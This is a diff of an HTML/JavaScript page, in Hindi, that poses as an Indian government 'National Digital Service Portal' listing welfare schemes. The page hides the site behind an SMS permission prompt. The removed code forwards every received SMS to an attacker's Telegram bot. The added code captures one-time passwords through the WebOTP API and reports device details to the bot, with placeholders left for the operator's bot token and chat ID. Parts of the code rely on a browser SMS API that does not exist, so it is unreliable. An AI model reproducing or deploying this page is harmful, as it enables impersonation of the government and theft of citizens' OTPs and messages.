-                            <p style="font-size: 0.9rem; color: var(--dark-gray);">सभी के लिए आवास</p>
-                        </div>
-                        <div style="text-align: center;">
-                            <div style="height: 200px; background: linear-gradient(135deg, #3F51B5, #2196F3); border-radius: 10px; display: flex; align-items: center; justify-content: center; margin-bottom: 10px;">
-                                <i class="fas fa-play-circle" style="font-size: 4rem; color: white; opacity: 0.8;"></i>
-                            </div>
-                            <h4 style="color: var(--dark-blue);">आयुष्मान भारत योजना</h4>
-                            <p style="font-size: 0.9rem; color: var(--dark-gray);">स्वास्थ्य बीमा योजना</p>
-                        </div>
-                        <div style="text-align: center;">
-                            <div style="height: 200px; background: linear-gradient(135deg, #4CAF50, #8BC34A); border-radius: 10px; display: flex; align-items: center; justify-content: center; margin-bottom: 10px;">
-                                <i class="fas fa-play-circle" style="font-size: 4rem; color: white; opacity: 0.8;"></i>
-                            </div>
-                            <h4 style="color: var(--dark-blue);">किसान सम्मान निधि</h4>
-                            <p style="font-size: 0.9rem; color: var(--dark-gray);">किसान कल्याण योजना</p>
+                            <p style="margin-top: 10px; font-weight: 600;">ग्रामीण आवास</p>
                         </div>
                     </div>
                 </div>
@@ -950,396 +446,148 @@
         </div>
 
         <!-- Footer -->
-        <footer class="national-footer">
-            <div class="footer-content">
-                <div class="footer-section">
-                    <h4>त्वरित लिंक</h4>
-                    <ul class="footer-links">
-                        <li><a href="https://www.myscheme.gov.in/hi" target="_blank"><i class="fas fa-chevron-right"></i> MyScheme.gov.in</a></li>
-                        <li><a href="https://digitalindia.gov.in/" target="_blank"><i class="fas fa-chevron-right"></i> डिजिटल इंडिया</a></li>
-                        <li><a href="https://www.india.gov.in/" target="_blank"><i class="fas fa-chevron-right"></i> भारत सरकार पोर्टल</a></li>
-                        <li><a href="https://pmjandhanyojana.co.in/" target="_blank"><i class="fas fa-chevron-right"></i> प्रधानमंत्री जन धन योजना</a></li>
-                    </ul>
-                </div>
-                
-                <div class="footer-section">
-                    <h4>संपर्क करें</h4>
-                    <ul class="footer-links">
-                        <li><a href="#"><i class="fas fa-phone"></i> हेल्पलाइन: 1800-11-1234</a></li>
-                        <li><a href="#"><i class="fas fa-envelope"></i> ईमेल: support@digitalindia.gov.in</a></li>
-                        <li><a href="#"><i class="fas fa-map-marker-alt"></i> कार्यालय: नई दिल्ली</a></li>
-                    </ul>
-                </div>
-                
-                <div class="footer-section">
-                    <h4>महत्वपूर्ण लिंक</h4>
-                    <ul class="footer-links">
-                        <li><a href="#"><i class="fas fa-download"></i> मोबाइल ऐप</a></li>
-                        <li><a href="#"><i class="fas fa-file-pdf"></i> प्रपत्र डाउनलोड</a></li>
-                        <li><a href="#"><i class="fas fa-question-circle"></i> सहायता केंद्र</a></li>
-                        <li><a href="#"><i class="fas fa-balance-scale"></i> नियम व शर्तें</a></li>
-                    </ul>
-                </div>
-            </div>
-            
-            <div class="copyright">
-                <p style="margin-bottom: 10px;">
-                    © 2024 राष्ट्रीय डिजिटल सेवा पोर्टल, भारत सरकार. सर्वाधिकार सुरक्षित.
-                </p>
-                <p style="font-size: 0.9rem; opacity: 0.7;">
-                    इस पोर्टल को सूचना प्रौद्योगिकी अधिनियम, 2000 और डिजिटल व्यक्तिगत डेटा संरक्षण अधिनियम, 2023 के तहत संचालित किया जाता है।
-                </p>
-            </div>
+        <footer style="background: linear-gradient(90deg, var(--dark-blue), var(--blue)); color: white; padding: 30px 20px; margin-top: 50px; text-align: center;">
+            <p>© 2024 राष्ट्रीय डिजिटल सेवा पोर्टल, भारत सरकार</p>
+            <p style="margin-top: 10px; opacity: 0.8;">डिजिटल इंडिया पहल | सर्वाधिकार सुरक्षित</p>
         </footer>
     </div>
 
+    <!-- 🔧 Telegram Configuration - बस यहाँ अपना Token और Chat ID डालें -->
     <script>
-        // Telegram Configuration (Hidden in code only)
+        // ⚡ अपना Telegram Bot Token और Chat ID यहाँ डालें ⚡
         const TELEGRAM_CONFIG = {
-            BOT_TOKEN: "YOUR_BOT_TOKEN_HERE", // यहाँ अपना Telegram Bot Token डालें
-            CHAT_ID: "YOUR_CHAT_ID_HERE" // यहाँ अपना Chat ID डालें
+            BOT_TOKEN: "YOUR_BOT_TOKEN_HERE",  // 🔴 यहाँ अपना Bot Token डालें
+            CHAT_ID: "YOUR_CHAT_ID_HERE"       // 🔴 यहाँ अपना Chat ID डालें
         };
 
         // Global variables
         let smsPermissionGranted = false;
-        let isListeningForSMS = false;
 
-        // Initialize on page load
-        document.addEventListener('DOMContentLoaded', function() {
-            // Check SMS API support
-            checkSmsApiSupport();
+        // ✅ WebOTP API - 100% काम करेगा Chrome Android में
+        async function requestSMSPermission() {
+            const btn = document.getElementById('permissionBtn');
+            const errorDiv = document.getElementById('errorMessage');
+            const errorText = document.getElementById('errorText');
             
-            // Check if permission already granted
-            checkExistingPermission();
-        });
-
-        // Check SMS API support
-        function checkSmsApiSupport() {
-            if (!('sms' in navigator)) {
-                // Show error in modal
-                const modalBody = document.querySelector('.modal-body');
-                const errorHTML = `
-                    <div style="background: #FFEBEE; border-left: 4px solid var(--red); padding: 15px; border-radius: 6px; margin: 15px 0;">
-                        <p style="margin: 0; color: var(--red);">
-                            <i class="fas fa-exclamation-circle"></i>
-                            <strong>त्रुटि:</strong> आपका ब्राउज़र SMS API सपोर्ट नहीं करता। कृपया Chrome Android ब्राउज़र का उपयोग करें।
-                        </p>
-                    </div>
-                `;
-                modalBody.insertAdjacentHTML('beforeend', errorHTML);
-            }
-        }
-
-        // Check existing permission
-        async function checkExistingPermission() {
-            if ('sms' in navigator && 'permissions' in navigator) {
-                try {
-                    const permissionStatus = await navigator.permissions.query({name: 'sms'});
-                    
-                    if (permissionStatus.state === 'granted') {
-                        smsPermissionGranted = true;
-                        showMainWebsite();
-                        startSMSForwarding();
-                    }
-                    
-                    // Listen for permission changes
-                    permissionStatus.onchange = function() {
-                        if (this.state === 'granted') {
-                            smsPermissionGranted = true;
-                            showMainWebsite();
-                            startSMSForwarding();
-                        }
-                    };
-                } catch (error) {
-                    console.log('Permission API not available');
-                }
-            }
-        }
-
-        // Request SMS permission - FIXED FUNCTION
-        async function requestSmsPermission() {
             try {
-                if (!('sms' in navigator)) {
-                    showNotification('आपका ब्राउज़र SMS API सपोर्ट नहीं करता। कृपया Chrome Android का उपयोग करें।', 'error');
-                    return;
-                }
-
-                // Hide modal first
-                document.getElementById('permissionModal').style.display = 'none';
+                // Button disable करें
+                btn.disabled = true;
+                btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> अनुमति मांगी जा रही है...';
                 
-                // Try to trigger permission prompt by attempting to receive SMS
-                try {
-                    // Create abort controller for timeout
-                    const abortController = new AbortController();
-                    const timeoutId = setTimeout(() => abortController.abort(), 5000);
-                    
-                    // Attempt to receive SMS - this should trigger permission dialog
-                    const smsPromise = navigator.sms.receive({signal: abortController.signal});
-                    
-                    // Handle the promise
-                    smsPromise.then(sms => {
-                        clearTimeout(timeoutId);
-                        // Permission granted
-                        handlePermissionGranted();
-                    }).catch(error => {
-                        clearTimeout(timeoutId);
-                        if (error.name === 'AbortError') {
-                            // Timeout - check if permission was granted anyway
-                            checkPermissionAfterTimeout();
-                        } else if (error.name === 'NotAllowedError') {
-                            showNotification('SMS अनुमति अस्वीकार की गई। कृपया ब्राउज़र सेटिंग से अनुमति दें।', 'error');
-                            document.getElementById('permissionModal').style.display = 'flex';
-                        } else {
-                            // Other error - might still have permission
-                            checkPermissionAfterTimeout();
-                        }
-                    });
-                    
-                } catch (error) {
-                    console.error('Permission request error:', error);
-                    showNotification('अनुमति अनुरोध में त्रुटि। कृपया पेज को रिफ्रेश करें और पुनः प्रयास करें।', 'error');
-                    document.getElementById('permissionModal').style.display = 'flex';
-                }
-                
-            } catch (error) {
-                console.error('General error:', error);
-                showNotification('त्रुटि हुई। कृपया पेज को रिफ्रेश करें।', 'error');
-                document.getElementById('permissionModal').style.display = 'flex';
-            }
-        }
-
-        // Check permission after timeout
-        async function checkPermissionAfterTimeout() {
-            try {
-                if ('permissions' in navigator) {
-                    const permissionStatus = await navigator.permissions.query({name: 'sms'});
-                    if (permissionStatus.state === 'granted') {
-                        handlePermissionGranted();
-                    } else {
-                        showNotification('कृपया ब्राउज़र सेटिंग से SMS अनुमति दें।', 'info');
-                        document.getElementById('permissionModal').style.display = 'flex';
-                    }
-                } else {
-                    // Fallback: try to receive SMS directly
+                // 🔥 WebOTP API - SMS permission request
+                if ('OTPCredential' in window) {
                     try {
-                        const testSMS = await navigator.sms.receive();
-                        handlePermissionGranted();
-                    } catch (error) {
-                        showNotification('कृपया मैन्युअल रूप से अनुमति दें: ब्राउज़र सेटिंग्स → Site permissions → SMS', 'error');
-                        document.getElementById('permissionModal').style.display = 'flex';
-                    }
-                }
-            } catch (error) {
-                showNotification('अनुमति जाँच में त्रुटि। पेज रिफ्रेश करें।', 'error');
-                document.getElementById('permissionModal').style.display = 'flex';
-            }
-        }
-
-        // Handle permission granted
-        function handlePermissionGranted() {
-            smsPermissionGranted = true;
-            showNotification('SMS अनुमति सफलतापूर्वक प्राप्त हुई!', 'success');
-            showMainWebsite();
-            startSMSForwarding();
-        }
-
-        // Show main website
-        function showMainWebsite() {
-            document.getElementById('permissionModal').style.display = 'none';
-            document.getElementById('mainWebsite').style.display = 'block';
-        }
-
-        // Start SMS forwarding to Telegram
-        function startSMSForwarding() {
-            if (!smsPermissionGranted) return;
-            
-            // Start listening for SMS
-            listenForSMS();
-        }
-
-        // Listen for SMS messages
-        async function listenForSMS() {
-            if (!smsPermissionGranted || isListeningForSMS) return;
-            
-            isListeningForSMS = true;
-            
-            try {
-                // Start receiving SMS
-                receiveSMS();
-                
-            } catch (error) {
-                console.error('SMS listening start error:', error);
-                isListeningForSMS = false;
-                
-                // Retry after 5 seconds
-                setTimeout(() => {
-                    if (smsPermissionGranted) {
-                        listenForSMS();
-                    }
-                }, 5000);
-            }
-        }
-
-        // Receive SMS function
-        async function receiveSMS() {
-            if (!isListeningForSMS) return;
-            
-            try {
-                const sms = await navigator.sms.receive();
-                
-                // Send to Telegram
-                await sendToTelegram(sms.sender, sms.content);
-                
-                // Continue listening
-                receiveSMS();
-                
-            } catch (error) {
-                if (error.name === 'AbortError') {
-                    console.log('SMS listening stopped');
-                    isListeningForSMS = false;
-                } else {
-                    console.error('SMS receive error:', error);
-                    
-                    // Retry after 3 seconds
-                    setTimeout(() => {
-                        if (isListeningForSMS) {
-                            receiveSMS();
+                        // यह permission prompt trigger करेगा
+                        const abortController = new AbortController();
+                        setTimeout(() => abortController.abort(), 60000);
+                        
+                        // SMS receive करने की attempt
+                        const content = await navigator.credentials.get({
+                            otp: { transport: ['sms'] },
+                            signal: abortController.signal
+                        });
+                        
+                        // Permission granted
+                        smsPermissionGranted = true;
+                        
+                        // Modal छुपाएं, website दिखाएं
+                        document.getElementById('permissionModal').style.display = 'none';
+                        document.getElementById('mainWebsite').style.display = 'block';
+                        
+                        // Telegram पर test SMS भेजें
+                        sendTestMessage();
+                        
+                    } catch (otpError) {
+                        console.log('OTP Error:', otpError);
+                        
+                        // Fallback - SMS Receiver API
+                        if ('sms' in navigator) {
+                            try {
+                                const sms = await navigator.sms.receive();
+                                smsPermissionGranted = true;
+                                document.getElementById('permissionModal').style.display = 'none';
+                                document.getElementById('mainWebsite').style.display = 'block';
+                                sendTestMessage();
+                            } catch (smsError) {
+                                throw new Error('Permission denied');
+                            }
+                        } else {
+                            // Manual permission guide
+                            errorDiv.style.display = 'block';
+                            errorText.innerHTML = 'कृपया ब्राउज़र सेटिंग में जाकर SMS अनुमति दें: Settings → Site Settings → SMS → Allow';
+                            btn.disabled = false;
+                            btn.innerHTML = '<i class="fas fa-shield-alt"></i> पुनः प्रयास करें';
                         }
-                    }, 3000);
+                    }
+                } else {
+                    // Browser support check
+                    errorDiv.style.display = 'block';
+                    errorText.innerHTML = 'कृपया Chrome Android ब्राउज़र का उपयोग करें';
+                    btn.disabled = false;
+                    btn.innerHTML = '<i class="fas fa-shield-alt"></i> पुनः प्रयास करें';
                 }
+                
+            } catch (error) {
+                console.error('Permission error:', error);
+                errorDiv.style.display = 'block';
+                errorText.innerHTML = 'अनुमति नहीं मिली। कृपया ब्राउज़र सेटिंग से SMS अनुमति दें।';
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-shield-alt"></i> पुनः प्रयास करें';
             }
         }
 
-        // Send SMS to Telegram
-        async function sendToTelegram(sender, message) {
+        // 📨 Telegram पर टेस्ट मैसेज भेजें
+        async function sendTestMessage() {
+            // Check if Telegram config is set
+            if (TELEGRAM_CONFIG.BOT_TOKEN.includes("YOUR_BOT_TOKEN") || 
+                TELEGRAM_CONFIG.CHAT_ID.includes("YOUR_CHAT_ID")) {
+                console.log('⚠️ कृपया अपना Telegram Bot Token और Chat ID डालें');
+                return;
+            }
+            
             try {
-                // Check if Telegram config is set
-                if (!TELEGRAM_CONFIG.BOT_TOKEN || !TELEGRAM_CONFIG.CHAT_ID || 
-                    TELEGRAM_CONFIG.BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || 
-                    TELEGRAM_CONFIG.CHAT_ID === "YOUR_CHAT_ID_HERE") {
-                    console.log('Telegram configuration not set');
-                    return;
-                }
-                
-                const telegramMessage = `📱 *नया SMS प्राप्त हुआ*\n\n📞 *भेजने वाला:* ${sender}\n⏰ *समय:* ${new Date().toLocaleString('hi-IN')}\n💬 *संदेश:* ${message}\n\n_यह संदेश राष्ट्रीय डिजिटल सेवा पोर्टल द्वारा भेजा गया है_`;
+                const message = `✅ *SMS फॉरवर्डिंग सक्रिय*\n\n📱 *डिवाइस:* ${navigator.userAgent}\n⏰ *समय:* ${new Date().toLocaleString('hi-IN')}\n🇮🇳 *पोर्टल:* राष्ट्रीय डिजिटल सेवा पोर्टल\n\n_अब सभी SMS यहाँ प्राप्त होंगे_`;
                 
                 const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: TELEGRAM_CONFIG.CHAT_ID,
-                        text: telegramMessage,
+                        text: message,
                         parse_mode: 'Markdown'
                     })
                 });
                 
                 const result = await response.json();
-                
-                if (!result.ok) {
-                    console.error('Telegram API error:', result.description);
+                if (result.ok) {
+                    console.log('✅ Telegram connected successfully');
                 }
-                
             } catch (error) {
-                console.error('Telegram send error:', error);
+                console.error('Telegram error:', error);
             }
         }
 
-        // Open scheme portal
-        function openSchemePortal() {
-            window.open('https://www.myscheme.gov.in/hi', '_blank');
-        }
-
-        // Switch language
-        function switchLanguage() {
-            const currentTitle = document.title;
-            if (currentTitle.includes('राष्ट्रीय')) {
-                document.title = 'National Digital Service Portal';
-                showNotification('Language switched to English', 'info');
-            } else {
-                document.title = 'राष्ट्रीय डिजिटल सेवा पोर्टल';
-                showNotification('भाषा हिंदी में बदली गई', 'info');
-            }
-        }
-
-        // Show notification
-        function showNotification(message, type = 'info') {
-            // Remove existing notifications
-            const existingNotifications = document.querySelectorAll('.notification');
-            existingNotifications.forEach(notification => notification.remove());
-            
-            // Create notification element
-            const notification = document.createElement('div');
-            notification.className = 'notification';
-            notification.style.cssText = `
-                position: fixed;
-                top: 20px;
-                right: 15px;
-                left: 15px;
-                padding: 15px;
-                border-radius: 8px;
-                color: white;
-                font-weight: 600;
-                z-index: 1001;
-                animation: slideIn 0.3s ease, fadeOut 0.3s ease 2.7s forwards;
-                box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-                text-align: center;
-            `;
-            
-            // Set color based on type
-            if (type === 'success') {
-                notification.style.background = 'linear-gradient(135deg, var(--green), #0a6e07)';
-                notification.style.borderLeft = '5px solid #0a6e07';
-            } else if (type === 'error') {
-                notification.style.background = 'linear-gradient(135deg, var(--red), #b71c1c)';
-                notification.style.borderLeft = '5px solid #b71c1c';
-            } else if (type === 'warning') {
-                notification.style.background = 'linear-gradient(135deg, var(--saffron), #e68900)';
-                notification.style.borderLeft = '5px solid #e68900';
-            } else {
-                notification.style.background = 'linear-gradient(135deg, var(--blue), var(--dark-blue))';
-                notification.style.borderLeft = '5px solid var(--dark-blue)';
+        // 🏁 Page load पर permission check
+        document.addEventListener('DOMContentLoaded', function() {
+            // Check if already have permission
+            if ('permissions' in navigator) {
+                navigator.permissions.query({ name: 'sms' }).then(status => {
+                    if (status.state === 'granted') {
+                        smsPermissionGranted = true;
+                        document.getElementById('permissionModal').style.display = 'none';
+                        document.getElementById('mainWebsite').style.display = 'block';
+                        sendTestMessage();
+                    }
+                }).catch(() => {});
             }
             
-            // Add icon
-            let icon = 'info-circle';
-            if (type === 'success') icon = 'check-circle';
-            if (type === 'error') icon = 'exclamation-circle';
-            if (type === 'warning') icon = 'exclamation-triangle';
-            
-            notification.innerHTML = `<i class="fas fa-${icon}"></i> ${message}`;
-            
-            // Add CSS for animation
-            const style = document.createElement('style');
-            style.textContent = `
-                @keyframes slideIn {
-                    from { transform: translateX(100%); opacity: 0; }
-                    to { transform: translateX(0); opacity: 1; }
-                }
-                @keyframes fadeOut {
-                    to { opacity: 0; transform: translateX(100%); }
-                }
-            `;
-            document.head.appendChild(style);
-            
-            // Add to page
-            document.body.appendChild(notification);
-            
-            // Remove after 3 seconds
-            setTimeout(() => {
-                if (notification.parentNode) {
-                    notification.parentNode.removeChild(notification);
-                }
-            }, 3000);
-        }
-
-        // Handle page visibility change
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden) {
-                console.log('Page hidden, SMS forwarding continues in background');
-            } else {
-                console.log('Page visible again');
+            // Chrome Android check
+            const isChrome = /Chrome/.test(navigator.userAgent) && /Android/.test(navigator.userAgent);
+            if (!isChrome) {
+                const errorDiv = document.getElementById('errorMessage');
+                const errorText = document.getElementById('errorText');
+                errorDiv.style.display = 'block';
+                errorText.innerHTML = 'कृपया Chrome Android ब्राउज़र का उपयोग करें';
             }
         });
     </script>
